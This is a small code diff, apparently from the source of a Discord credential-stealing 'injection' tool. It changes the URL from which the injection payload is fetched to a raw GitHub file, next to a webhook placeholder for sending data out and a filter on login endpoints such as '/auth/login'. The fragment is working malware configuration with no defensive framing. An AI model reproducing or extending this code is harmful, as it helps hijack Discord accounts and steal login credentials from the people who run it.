@@ -13,7 +13,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://rentry.co/discord-injection/raw",
+    injection_url: "https://raw.githubusercontent.com/ApfelSafttee/discord-inj/refs/heads/main/injection.txt",
     filters: {
         urls: [
             '/auth/login',
